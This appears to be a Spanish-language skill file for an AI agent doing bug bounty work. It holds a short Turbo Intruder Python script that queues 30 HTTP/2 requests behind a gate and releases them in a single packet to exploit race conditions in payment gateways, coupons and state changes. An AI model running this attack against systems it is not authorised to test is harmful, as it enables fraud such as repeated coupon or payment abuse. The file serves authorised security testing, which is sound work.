---
name: bug-bounty-race-condition-single-packet-h2
description: Pruebas de condiciones de carrera (Race Conditions) con HTTP/2 y sincronización de un solo paquete (Single-Packet Attack / Last-Byte Sync) en Turbo Intruder.
---

# Skill: Race Condition Testing with HTTP/2 Single-Packet Sync

Esta habilidad capacita al agente para escribir scripts de Turbo Intruder configurados para enviar conjuntos de peticiones HTTP/2 en un único paquete de red TCP, explotando ventanas de tiempo atómicas en pasarelas de pago, cupones o cambios de estado.

## 📌 Configuración Single-Packet Sync en Turbo Intruder

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
```

---

## 📚 Referencias Técnicas

Consulta los detalles en:
[h2-race-condition-guide.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-race-condition-single-packet-h2/references/h2-race-condition-guide.md)
